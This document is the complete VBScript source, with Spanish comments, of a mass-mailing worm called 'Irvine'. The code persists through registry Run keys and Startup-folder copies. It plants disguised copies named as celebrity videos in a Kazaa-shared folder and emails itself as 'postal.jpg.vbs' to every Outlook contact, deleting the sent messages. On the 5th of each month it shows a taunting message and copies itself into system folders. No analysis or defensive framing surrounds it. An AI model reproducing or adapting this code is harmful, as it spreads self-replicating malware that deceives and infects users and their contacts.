   'Codigo Fuente de Irvine

   On Error Resume Next

   Set Obj_Shell = CreateObject("wscript.shell")
   Set Copia_Fichero=CreateObject("Scripting.FileSystemObject")
   Set Obj_File = CreateObject("Scripting.FileSystemObject")

   Clave_Registro = Obj_Shell.RegRead ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Irvine")

   If Clave_Registro <> 1 Then
       Call Infecta()
   Else
       Call Reproducirse()
   End If

   If (Day(Now())=5) Then
       Msgbox "Wake up stupid, Microsoft Has You!",48,"Knock, knock..."
       Call Llenar_Disco()
   End If

   Function Infecta()
       Directorio=Obj_File.GetSpecialFolder(WindowsFolder)
       Obj_Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft_Service","""wscript.exe " & Directorio & "\system\service.dll.vbs"" " & "/background"
       Obj_Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Irvine",1
       Copia_Fichero.CopyFile ".\postal.jpg.vbs", Directorio & "\system\service.dll.vbs"
       Directorio=Obj_Shell.SpecialFolders("AllUsersStartup")
       Copia_Fichero.CopyFile ".\postal.jpg.vbs", Directorio & "\service.dll.vbs"
       Obj_Shell.Run "www.google.com"
   End Function

   Function Llenar_Disco()
       Directorio=obj_file.GetSpecialFolder(WindowsFolder)
       Do
           i=i+1
           Randomize
           SELECT CASE (Rnd*4)
               CASE(0):
                   Directorio1= Obj_File.GetSpecialFolder(WindowsFolder)
               CASE(1):
                   Directorio1= Obj_File.GetSpecialFolder(SystemFolder)
               CASE(2):
                   Directorio1= Obj_File.GetSpecialFolder(TemporaryFolder)
           END SELECT
           if i>3 then
               exit function
           end if
           Copia_Fichero.CopyFile Directorio & "\system\service.dll.vbs", Directorio1 & "\" & i & ".dll.vbs"
       Loop
   End Function

   Function Reproducirse()
       Directorio=obj_file.GetSpecialFolder(WindowsFolder)
       Copia_Fichero.CreateFolder (Directorio & "\Archivos_Compartidos")
       Copia_Fichero.CopyFile Directorio & "\system\service.dll.vbs", Directorio & "\Archivos_Compartidos\Tera Patrick.avi.vbs"
       Copia_Fichero.CopyFile Directorio & "\system\service.dll.vbs", Directorio & "\Archivos_Compartidos\Pamela Anderson Tommy Lee.avi.vbs"
       Copia_Fichero.CopyFile Directorio & "\system\service.dll.vbs", Directorio & "\Archivos_Compartidos\Jennifer Lopez Desnuda.jpg.vbs"
       Copia_Fichero.CopyFile Directorio & "\system\service.dll.vbs", Directorio & "\Archivos_Compartidos\Tatu Video.avi.vbs"
       Copia_Fichero.CopyFile Directorio & "\system\service.dll.vbs", Directorio & "\Archivos_Compartidos\Hackear Cuenta Hotmail.txt.vbs"

   '   Para usuarios del Kaaza
       Obj_Shell.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DownloadDir", Directorio & "\system\Archivos_Compartidos"

   '   Envia copia del postal.jpg.vbs a todos los contactos del Outlook
       Copia_Fichero.CopyFile Directorio & "\system\service.dll.vbs", Directorio & "\Archivos_Compartidos\postal.jpg.vbs", False
       Set objOutlook = CreateObject("Outlook.Application")

       Set Obj_Outlook = objOutlook.GetNameSpace("MAPI")
       Set Lista_Contactos = Obj_Outlook.AddressLists
       For Each Contacto In Lista_Contactos
       If Contacto.AddressEntries.Count <> 0 Then
       Contador = Contacto.AddressEntries.Count
       For n = 1 To Contador
       Set objMailItem = objOutlook.CreateItem(olMailItem)
       Set Direccion = Contacto.AddressEntries(n)
           With objMailItem
               .To = Direccion.Address
               .Subject = "¡Mira que pedazo de postal!"
               .Body = "Esta postal tan graciosa me ha recordado a ti"
                   AtachPath = Directorio & "\Archivos_Compartidos\postal.jpg.vbs"
               .Attachments.Add AtachPath
               objMailItem.DeleteAfterSubmit = True
               If .To <> "" Then
                   .Send
               End If
           End With
       Next
       End If
       Next
   End Function
